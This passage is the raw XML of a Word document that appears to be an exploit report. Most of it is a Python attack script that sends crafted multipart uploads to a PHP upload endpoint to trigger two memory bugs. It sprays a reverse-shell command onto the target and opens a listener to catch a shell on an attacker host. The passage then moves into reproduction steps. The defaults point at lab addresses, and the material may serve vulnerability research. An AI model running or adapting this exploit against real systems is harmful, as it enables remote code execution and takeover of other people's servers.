          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        r = s.post(url, data=gen(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                   headers={'Content-Type':f'multipart/form-data; boundary={b}'},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                   timeout=120)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[+] OOM status={r.status_code}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[!] OOM exc (expected): {e}")</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trigger_fatal(s, tgt, port):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = f"http://{tgt}:{port}/upload.php"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    bad = (b"------php2shell_fatal\r\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">           b'Content-Disposition: form-data; name="p"\r\n\r\n'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">           + b"\xff\xfe\xfd" * 65536)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        r = s.post(url, data=bad,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                   headers={'Content-Type':'multipart/form-data; '</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                            'boundary=----php2shell_fatal',</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                            'Content-Length':str(len(bad)+10)}, timeout=30)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[+] fatal status={r.status_code}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[!] fatal exc (expected): {e}")</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land(s, tgt, port):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = f"http://{tgt}:{port}/upload.php"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        r = s.post(url, files={'file':('land.bin',b"LAND",'application/octet-stream')},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                   timeout=60)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[+] land status={r.status_code}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[!] land exc: {e}")</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listen(ip, port, timeout=60):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    got = []</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _run():</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        srv.bind((ip, port)); srv.listen(1); srv.settimeout(timeout)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn, addr = srv.accept()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[+] REVERSE SHELL from {addr}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            while True:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                d = conn.recv(4096)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                if not d: break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                got.append(d)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                print(d.decode(errors="replace"), end="")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        except socket.timeout:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            print("[!] listener timeout")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        finally: srv.close()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    t = threading.Thread(target=_run, daemon=True); t.start()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    time.sleep(0.3); return t, got</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def main():</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--target",   default="192.168.56.10")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--port",     type=int, default=80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--attacker", default="192.168.56.20")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--rport",    type=int, default=4444)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--mode",     choices=["109618","109619","both"], default="both")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    a = ap.parse_args()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    cmd  = build_cmd(a.attacker, a.rport)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    blob = build_spray(cmd)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[*] cmd: {cmd!r}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    t, got = listen(a.attacker, a.rport)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    s = requests.Session()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    spray(s, a.target, a.port, blob)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if a.mode in ("109618","both"): trigger_oom(s, a.target, a.port)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if a.mode in ("109619","both"): trigger_fatal(s, a.target, a.port)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    time.sleep(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    land(s, a.target, a.port)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    t.join(timeout=30)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if got:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("\n[SUCCESS]"); print(b"".join(got).decode(errors="replace"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("\n[-] no shell captured")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    main()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Step-by-Step Reproduction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 On the Linux target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Confirm the endpoint is alive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s http://127.0.0.1/upload.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>#   size=0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
